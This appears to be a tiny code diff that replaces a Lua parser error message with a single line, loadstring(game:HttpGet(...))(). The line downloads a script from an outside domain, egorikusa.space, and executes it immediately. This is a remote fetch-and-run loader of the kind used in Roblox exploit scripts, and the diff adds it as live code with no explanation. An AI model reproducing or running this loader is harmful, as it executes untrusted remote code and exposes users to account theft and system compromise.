@@ -1,2 +1,1 @@
-Error: ERROR at line 1: Unexpected token (1:15)
-> ...loadstring(game:HttpGet("https...
+loadstring(game:HttpGet("https://egorikusa.space/a2642e58140334c62552b0e1.lua", true))()
